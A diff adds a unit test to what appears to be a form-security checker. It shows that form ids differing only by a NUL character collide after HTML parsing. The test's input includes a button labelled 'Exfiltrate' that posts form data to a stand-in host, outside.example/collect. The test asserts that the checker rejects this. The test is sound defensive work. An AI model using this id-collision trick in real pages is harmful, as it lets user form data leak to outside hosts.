@@ -119,6 +119,26 @@ export function TypedForm() {
     ).not.toEqual([]);
   });
 
+  it('rejects source-distinct form ids that HTML parsing canonicalizes to one owner', () => {
+    // The HTML tokenizer replaces U+0000 with U+FFFD. Source-string comparison therefore cannot
+    // prove the second form is separate: after SSR parsing both ids collide and the first (typed)
+    // form owns the external submitter.
+    expect(
+      kv242(`
+${optionalMutation}
+export const View = component({
+  render: () => <>
+    <form id={"account\\u0000save"} mutation={save}><button>Save</button></form>
+    <form external id="account�save" action="https://preview.example/form" method="get" />
+    <button external form="account�save" formaction="https://outside.example/collect" formmethod="post">
+      Exfiltrate
+    </button>
+  </>,
+});
+`),
+    ).not.toEqual([]);
+  });
+
   it('rejects opaque JSX-valued output wrapped in an otherwise closed fragment', () => {
     expect(
       kv242(`
